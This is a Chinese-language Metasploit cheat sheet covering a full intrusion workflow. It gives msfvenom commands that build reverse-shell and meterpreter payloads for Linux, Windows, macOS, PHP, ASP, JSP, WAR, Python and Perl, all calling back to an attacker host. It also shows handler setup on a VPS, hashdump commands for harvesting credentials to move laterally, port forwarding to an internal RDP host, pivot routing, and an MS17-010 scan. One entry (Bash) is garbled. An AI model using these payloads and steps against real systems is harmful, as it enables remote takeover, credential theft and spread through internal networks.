# MSF 一条龙



## Payload制作

### Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=12306 -f elf > shell.elf

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=12306 -f elf > shell.elf
```

### Windows

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=12306  -f exe > meinv.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=< Your IP Address> LPORT=12306  -f exe > meinv.exe
```

### Mac

```bash
msfvenom -p osx/x64/shell_reverse_tcp LHOST=<Your IP Address> LPORT=12306-f macho > shell.machoWeb 
```

### PHP

```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=12306 -f raw > shell.php
```

### ASP

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=12306 -f asp > shell.asp
```

### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=12306 -f raw > shell.jsp
```

### WAR

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=12306 -f war > shell.war
```

### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=12306 -f raw > shell.py
```

### Bash

```bash
vv
```

### Perl

```bash
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=12306 -f raw > shell.pl
```

### 技巧

```bash
msfvenom -l payloads  #查看支持的payloads 
-i 10 								#生成payload带上-i 10表示对payload编码10次
```

## 反弹设置

```bash
#Payload值根据实际使用的payload填写
set exitonsession false
use exploits/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST VPSIP
set LPORT 12307
exploit -j

#获取各种hashdump（search），未知密码情况下hashdump可以用来横向登录其它主机
run post/windows/gather/hashdump
或
run post/windows/gather/smart_hashdump

#只是临时想看下内网服务可以做端口映射，很快、稳、也方便。
meterpreter > portfwd add -l 14448 -r 172.16.200.6 -p 3389

#设置路由
#session内
run post/multi/manage/autoroute
#session外（backgroup)
#route 查看设置路由

#设置好后根据前面的msf路由可以打攻击流量，跨网段的还是用proxychain启动msf打比较稳。
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 10.20.100.201
exploit
```

